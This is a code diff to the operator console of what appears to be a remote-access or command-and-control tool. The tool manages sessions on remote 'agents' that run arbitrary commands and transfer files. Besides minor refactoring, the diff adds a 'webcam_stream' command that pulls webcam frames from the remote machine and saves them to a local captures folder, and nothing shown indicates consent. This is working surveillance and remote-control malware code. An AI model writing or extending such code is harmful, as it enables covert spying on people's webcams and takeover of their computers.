@@ -74,7 +74,7 @@ def _handle_server_command(app: ServerApp, state: CLIState, line: str) -> None:
         return
 
     if cmd == "sessions":
-        sessions = app.list_sessions()
+        sessions: dict[str, Session] = app.list_sessions()
         if not sessions:
             app.log.info("No active sessions.")
             return
@@ -97,7 +97,8 @@ def _handle_server_command(app: ServerApp, state: CLIState, line: str) -> None:
         if app.get_session(args[0]) is None:
             app.log.info("Unknown session: %s", args[0])
             return
-        state.__dict__.update(CLIState(active_session_id=args[0]).__dict__)
+        state_active = CLIState(active_session_id=args[0])
+        state.__dict__.update(state_active.__dict__)
         app.log.info("Interacting with agent %s. Type 'back' to return.", args[0])
         return
 
@@ -106,7 +107,8 @@ def _handle_server_command(app: ServerApp, state: CLIState, line: str) -> None:
 
 def _handle_agent_command(app: ServerApp, state: CLIState, line: str) -> None:
     if line.strip().lower() in {"back", "exit", "quit"}:
-        state.__dict__.update(CLIState(active_session_id=None).__dict__)
+        state_active = CLIState(active_session_id=None)
+        state.__dict__.update(state_active.__dict__)
         return
 
     sess = app.get_session(state.active_session_id or "")
@@ -124,6 +126,9 @@ def _handle_agent_command(app: ServerApp, state: CLIState, line: str) -> None:
             return
         if cmd == "upload":
             _server_upload(app, sess, parts[1:])
+            return
+        if cmd == "webcam_stream":
+            _server_webcam_stream(app, sess, parts[1:])
             return
 
         result = sess.peer.request("run", {"line": line}, timeout=120.0)
@@ -143,6 +148,7 @@ def _maybe_save_artifact(app: ServerApp, session_id: str, data: object) -> None:
         return
     try:
         import base64
+
         raw = base64.b64decode(b64.encode())
     except Exception as exc:
         app.log.warning("artifact decode failed: %s", exc)
@@ -190,7 +196,6 @@ def _server_download(app: ServerApp, sess: Session, args: list[str]) -> None:
                 break
             f.write(bytes(chunk))
             offset += len(chunk)
-
     sess.peer.request("download_finish", {"token": token}, timeout=10.0)
     app.log.info("Downloaded %s bytes to %s", offset, out_path)
 
@@ -226,3 +231,45 @@ def _server_upload(app: ServerApp, sess: Session, args: list[str]) -> None:
 
     sess.peer.request("upload_finish", {"token": token}, timeout=10.0)
     app.log.info("Uploaded %s bytes from %s to %s", size, local_path, remote_path)
+
+
+def _server_webcam_stream(app: ServerApp, sess: Session, args: list[str]) -> None:
+    if not args or args[0].lower() not in {"start", "stop"}:
+        app.log.info("Usage: webcam_stream start [seconds] | webcam_stream stop")
+        return
+    action = args[0].lower()
+    if action == "stop":
+        sess.peer.request("webcam_stream_stop", {}, timeout=10.0)
+        app.log.info("Webcam stream stopped.")
+        return
+
+    seconds = float(args[1]) if len(args) > 1 else 5.0
+    seconds = max(1.0, min(seconds, 60.0))
+    start = sess.peer.request("webcam_stream_start", {"fps": 5.0}, timeout=10.0).get("data", {})
+    if not isinstance(start, dict) or "token" not in start:
+        raise RuntimeError("Invalid webcam_stream_start response")
+    token = str(start["token"])
+
+    out_dir = Path("captures") / f"agent-{sess.session_id}" / "webcam_stream"
+    out_dir.mkdir(parents=True, exist_ok=True)
+    app.log.info("Streaming for %.1fs. Saving frames to %s", seconds, out_dir)
+
+    deadline = time.time() + seconds
+    frame_idx = 0
+    while time.time() < deadline:
+        evt = sess.peer.next_event(timeout=1.0)
+        if not evt or evt.get("name") != "webcam_frame":
+            continue
+        data = evt.get("data", {})
+        if not isinstance(data, dict):
+            continue
+        if str(data.get("token")) != token:
+            continue
+        jpeg = data.get("jpeg")
+        if not isinstance(jpeg, bytes | bytearray):
+            continue
+        (out_dir / f"frame-{frame_idx:05d}.jpg").write_bytes(bytes(jpeg))
+        frame_idx += 1
+
+    sess.peer.request("webcam_stream_stop", {}, timeout=10.0)
+    app.log.info("Webcam stream saved %s frames.", frame_idx)
